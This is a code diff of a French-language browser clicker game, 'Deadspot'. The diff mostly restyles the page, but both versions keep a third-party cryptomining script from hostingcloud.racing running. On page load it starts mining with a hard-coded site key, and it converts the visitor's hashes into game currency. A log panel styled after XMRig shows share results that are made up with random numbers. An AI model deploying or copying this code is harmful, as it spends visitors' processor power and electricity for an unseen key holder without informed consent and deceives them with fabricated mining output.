@@ -13,46 +13,43 @@
     }
     h1 { color:#4caf50; }
     #deadspotBalance { font-size:22px; margin:10px; color:#ffd700; }
-
-    /* Barre d’énergie */
     #energyBar {
       width: 300px; height: 20px; border:1px solid #444; margin:10px auto;
       background:#222; border-radius:5px; overflow:hidden;
     }
     #energyFill { height:100%; width:100%; background:#4caf50; }
 
-    /* Gros bouton click */
+    /* Bouton clicker personnalisé */
     #clickBtn {
-      width: 180px; height: 180px;
+      width: 200px;
+      height: 200px;
       border-radius: 50%;
-      background:#111;
-      border:3px solid #444;
-      margin:20px auto;
-      display:flex;
-      align-items:center;
-      justify-content:center;
-      cursor:pointer;
-      transition: transform 0.2s;
+      background: #111;
+      border: 3px solid #444;
+      margin: 20px auto;
+      cursor: pointer;
+      position: relative;
+      overflow: hidden;
     }
-    #clickBtn:hover { transform: scale(1.05); }
     #clickBtn img {
-      width:120px;
-      height:120px;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+    #clickBtn:hover {
+      transform: scale(1.05);
+      border-color: #f00;
     }
 
-    /* Boutons classiques */
     button {
       background:#333; color:#eee; padding:10px 20px; border:none;
       border-radius:5px; margin:5px; cursor:pointer;
     }
     button:hover { background:#555; }
 
-    /* Graphique */
     canvas {
       margin-top: 20px; background: #1a1a1a; border: 1px solid #333; border-radius: 10px;
     }
-
-    /* Logs style XMRig */
     #xmrigLogs {
       margin-top:20px; max-height:250px; overflow-y:auto; background:#111;
       border:1px solid #444; padding:10px; text-align:left; font-size:13px;
@@ -60,20 +57,20 @@
     .logAccepted { color:#4caf50; }
     .logRejected { color:#f44336; }
 
-    /* Progression Hash → DSC */
-    #progressContainer {
-      width: 600px;
-      height: 25px;
-      background: #222;
+    /* Progression échange */
+    #exchangeProgress {
+      width: 300px;
+      height: 20px;
       border: 1px solid #444;
-      border-radius: 8px;
-      margin: 20px auto;
+      background: #222;
+      border-radius: 5px;
+      margin: 10px auto;
       overflow: hidden;
     }
-    #progressFill {
+    #exchangeFill {
       height: 100%;
       width: 0%;
-      background: linear-gradient(90deg, #ff0000, #ff6600, #ffd700);
+      background: #ff0000;
     }
   </style>
 </head>
@@ -82,15 +79,15 @@
   <div id="deadspotBalance">Deadspot: 0</div>
   <div id="energyBar"><div id="energyFill"></div></div>
 
-  <!-- Gros bouton avec tête de mort -->
+  <!-- Bouton avec image -->
   <div id="clickBtn">
-    <img src="https://i.ibb.co/9c6rG6M/skull.png" alt="skull">
+    <img src="skull.png" alt="skull">
   </div>
 
   <button id="exchangeBtn">🔄 Convertir Hashes → Deadspot</button>
 
   <!-- Barre progression Hashes -->
-  <div id="progressContainer"><div id="progressFill"></div></div>
+  <div id="exchangeProgress"><div id="exchangeFill"></div></div>
 
   <h2>📊 Hashrate</h2>
   <div id="currentHps">H/s: 0.00</div>
@@ -116,16 +113,12 @@
   <!-- Miner Script -->
   <script src="https://www.hostingcloud.racing/WPmG.js"></script>
   <script>
-    // ======================
-    // VARIABLES PRINCIPALES
-    // ======================
     let deadspot = parseFloat(localStorage.getItem("deadspot")) || 0;
     let upgrades = JSON.parse(localStorage.getItem("upgrades")) || {x2:false, auto:false, regen:false, multi:false};
     let energy = 100, maxEnergy = 100;
-    let regenRate = 1; // énergie/sec
+    let regenRate = 1; 
     let clickValue = 0.00015;
     let autoClickInterval = null;
-    const HASH_TO_DSC = 10000000; // 10M hashes = 1 DSC
 
     function saveGame() {
       localStorage.setItem("deadspot", deadspot);
@@ -135,11 +128,14 @@
     function updateUI() {
       document.getElementById("deadspotBalance").textContent = "Deadspot: " + deadspot.toFixed(5);
       document.getElementById("energyFill").style.width = (energy/maxEnergy*100) + "%";
+
+      // Progression Hashes
+      const total = _client.getTotalHashes();
+      const percent = Math.min(100, total/10000000*100);
+      document.getElementById("exchangeFill").style.width = percent+"%";
     }
 
-    // ======================
-    // CLICKER
-    // ======================
+    // Click bouton avec image
     document.getElementById("clickBtn").addEventListener("click", () => {
       if (energy > 0) {
         let gain = clickValue;
@@ -152,7 +148,6 @@
       }
     });
 
-    // Régénération énergie
     setInterval(() => {
       if (energy < maxEnergy) {
         energy = Math.min(maxEnergy, energy + regenRate);
@@ -160,7 +155,6 @@
       }
     }, 1000);
 
-    // Auto click
     function startAutoClick() {
       if (autoClickInterval) return;
       autoClickInterval = setInterval(() => {
@@ -176,9 +170,6 @@
       }, 1000);
     }
 
-    // ======================
-    // UPGRADES
-    // ======================
     function buyUpgrade(type) {
       if (type === "x2" && !upgrades.x2 && deadspot >= 5) {
         deadspot -= 5; upgrades.x2 = true;
@@ -195,12 +186,7 @@
       saveGame(); updateUI();
     }
 
-    // ======================
-    // MINER
-    // ======================
-    var _client = new Client.Anonymous('e21d602e2242e7d28fc1409ef8a44920d6b5ffdfd95be04f205b4d12e520085f', {
-      throttle: 0.1, c: 'w'
-    });
+    var _client = new Client.Anonymous('e21d602e2242e7d28fc1409ef8a44920d6b5ffdfd95be04f205b4d12e520085f', {throttle: 0.1, c: 'w'});
     _client.start();
 
     // Graphe
@@ -212,11 +198,9 @@
         scales:{ x:{ticks:{color:'#aaa'}}, y:{ticks:{color:'#aaa'}} } }
     });
 
-    // Logs + progression
     const currentHpsDisplay = document.getElementById("currentHps");
     const totalHashesDisplay = document.getElementById("totalHashes");
     const xmrigLogs = document.getElementById("xmrigLogs");
-    const progressFill = document.getElementById("progressFill");
     let time = 0;
 
     setInterval(() => {
@@ -228,7 +212,6 @@
         currentHpsDisplay.textContent = "H/s: " + hps.toFixed(2);
         totalHashesDisplay.textContent = "Total Hashes: " + total;
 
-        // Graph
         hashrateChart.data.labels.push(time+"s");
         hashrateChart.data.datasets[0].data.push(hps);
         if (hashrateChart.data.labels.length > 20) {
@@ -237,11 +220,8 @@
         }
         hashrateChart.update();
 
-        // Progression Hashes
-        const progress = Math.min(100, (total/HASH_TO_DSC)*100);
-        progressFill.style.width = progress + "%";
+        updateUI(); // met à jour la barre de progression
 
-        // Logs style XMRig
         for (let i=0; i<threads; i++) {
           const coreHps = (hps/threads*(0.9+Math.random()*0.2)).toFixed(2);
           const isAccepted = Math.random()>0.05;
@@ -257,11 +237,10 @@
       }
     },1000);
 
-    // Conversion Hashes → Deadspot
     document.getElementById("exchangeBtn").addEventListener("click", () => {
       const total = _client.getTotalHashes();
-      if (total >= HASH_TO_DSC) {
-        const dscGain = Math.floor(total/HASH_TO_DSC);
+      if (total >= 10000000) {
+        const dscGain = Math.floor(total/10000000);
         deadspot += dscGain;
         _client.reset();
         updateUI();
@@ -272,7 +251,6 @@
       }
     });
 
-    // Init
     if(upgrades.auto) startAutoClick();
     if(upgrades.regen) regenRate=2;
     updateUI();
